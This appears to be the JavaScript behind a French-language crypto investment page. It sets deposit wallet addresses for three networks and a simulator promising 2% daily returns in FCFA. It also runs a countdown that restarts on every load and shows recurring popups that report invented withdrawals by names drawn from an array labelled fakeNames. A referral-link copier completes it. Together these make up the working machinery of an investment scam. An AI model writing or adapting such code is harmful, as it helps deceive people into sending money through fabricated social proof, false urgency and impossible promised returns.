// Configuration des Adresses
const walletAddresses = { 
    bep20: "0xfd3a795b11951cb62c28af99c09ad0d05bb80289", 
    trc20: "TMWz63LfZEkKJKR6fhbAZ4nwNQRR7k3oim", 
    erc20: "0xfd3a795b11951cb62c28af99c09ad0d05bb80289" 
};

// Mise à jour de l'adresse selon le réseau
function updateAddress() {
    const selectedNet = document.getElementById('network').value;
    document.getElementById('walletAddress').value = walletAddresses[selectedNet];
}

// Simulateur de Gains (2% par jour)
function calculateGains() {
    const amount = document.getElementById('investAmount').value;
    if(amount > 0) {
        const daily = amount * 0.02;
        const total = parseFloat(amount) + (daily * 30);
        document.getElementById('dailyGain').innerText = daily.toLocaleString() + " FCFA";
        document.getElementById('totalReturn').innerText = total.toLocaleString() + " FCFA";
    }
}

// Gestion du Compteur
function startCountdown() {
    let h = 23, m = 59, s = 59;
    setInterval(() => {
        s--;
        if(s < 0) { s = 59; m--; }
        if(m < 0) { m = 59; h--; }
        document.getElementById('seconds').innerText = s.toString().padStart(2, '0');
        document.getElementById('minutes').innerText = m.toString().padStart(2, '0');
        document.getElementById('hours').innerText = h.toString().padStart(2, '0');
    }, 1000);
}

// Notifications de Preuve Sociale
const fakeNames = ["Aminou", "Koffi", "Sarah", "Akofa", "John", "M. Yao"];
function showSocialProof() {
    const popup = document.getElementById('social-proof');
    const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
    const amount = (Math.floor(Math.random() * 50) + 5) * 1000;
    
    document.getElementById('p-text').innerHTML = `<strong>${name}</strong> vient de retirer <strong>${amount.toLocaleString()} FCFA</strong>`;
    document.getElementById('p-time').innerText = "À l'instant";
    
    popup.classList.add('show');
    setTimeout(() => popup.classList.remove('show'), 6000);
}

// Fonctions Copier
function copyAddress() {
    const el = document.getElementById('walletAddress');
    el.select();
    navigator.clipboard.writeText(el.value);
    alert("Adresse de recharge copiée !");
}

function copyRefLink() {
    const el = document.getElementById('refLink');
    el.select();
    navigator.clipboard.writeText(el.value);
    alert("Lien de parrainage copié !");
}

// Lancement au chargement
window.onload = () => {
    startCountdown();
    // Notification toutes les 20 secondes
    setInterval(showSocialProof, 20000);
    setTimeout(showSocialProof, 3000); // Première après 3s
};
